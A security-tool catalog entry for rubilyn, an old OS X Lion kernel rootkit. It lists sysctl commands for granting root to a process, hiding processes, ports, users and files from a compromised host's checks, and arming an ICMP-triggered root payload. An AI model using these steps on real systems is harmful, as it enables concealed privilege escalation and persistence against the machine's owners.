---
name: "rubilyn"
categories:
  - blackarch-backdoor
version: "0.0.1"
homepage: "http://nullsecurity.net/tools/backdoor.html"
packaged-by: [blackarch]
blackarch-builddate: "2016-12-31"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "nullsecuritynet/tools"
github-stars: 70
github-pushed: "2026-10-13"
github-archived: false
github-issues: 2
github-match: "exact"
gh-checked: "2026-11-09"
worth: 6.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 36
gh-activity-checked: "2026-11-09"
---

# rubilyn

> OS X kernel rootkit (Lion and below) controlled entirely from userland through sysctl — hides processes, ports, users and files, grants root to arbitrary PIDs, and can fire a root payload via magic ICMP.

## What it's for

rubilyn (author prdelka, distributed through nullsecurity) is a 64-bit Mac OS X kernel rootkit targeting Lion and earlier (tested on kernel 11.0.0+). It hooks the BSD subsystem without hardcoded addresses, combining syscall hooking with DKOM to hide activity on a host: give any PID root, hide and unhide processes, hide a TCP port from netstat, hide a user from `who`/`w`, and hide files or folders whose names match a given string. Once the kernel extension is loaded, all control happens from userland by writing to `debug.rubilyn.*` sysctl OIDs — either directly with sysctl(8) or through the bundled interactive `rubilyncon` console. It also embeds an ICMP backdoor: register a binary path and a magic ICMP ping to the host executes it with root privileges. Symbol resolution broke in Mountain Lion (the symtab is destroyed during load), so it is not portable above Lion.

No corpus evidence — derived from upstream documentation (release tarball source: `rubilyn.c`, `rubilyncon.c`).

## Typical use cases

### Grant root to a running process

Escalate a process you control to uid 0 without touching suid binaries or authentication logs.

```
sudo sysctl -w debug.rubilyn.pid=1337
```

Outcome: the rootkit elevates PID 1337 to root on the host where the kext is loaded; nothing appears in sudo or login audit trails.

### Hide a process, then restore it

Remove a process from listings on the compromised host.

```
sudo sysctl -w debug.rubilyn.pid2=1337
sudo sysctl -w debug.rubilyn.pid3=1337
```

Outcome: `pid2` removes PID 1337 from process listings; `pid3` unhides it. Do not kill a hidden process — the controller warns this corrupts the mach task.

### Hide a listening port, a user, and file names

Keep a backdoor service, an account, and its artifacts out of common checks.

```
sudo sysctl -w debug.rubilyn.port=4444
sudo sysctl -w debug.rubilyn.user=svc_backup
sudo sysctl -w debug.rubilyn.dir=backdoor
```

Outcome: the port disappears from netstat output, the username disappears from `who`/`w` listings, and any file or folder whose name contains the string `backdoor` is hidden from filesystem listings.

### Arm the ICMP backdoor

Register a payload the kernel will execute on a trigger packet.

```
sudo sysctl -w debug.rubilyn.cmd=/tmp/.update
```

Outcome: sets the binary path the rootkit executes with root privileges when the host receives the magic ICMP trigger ping.

### Drive all of the above from the bundled console

Prefer menus over typing sysctl OIDs.

```
./rubilyncon
```

Outcome: opens the interactive controller (shipped precompiled in the release tarball) wrapping the same sysctl writes — menu options 1-7 cover give-root, hide/unhide process, hide port, hide user, hide files, and set ICMP backdoor path; the ICMP-trigger and uninstall options were still marked "not ready yet" in the 0.0.1 release.
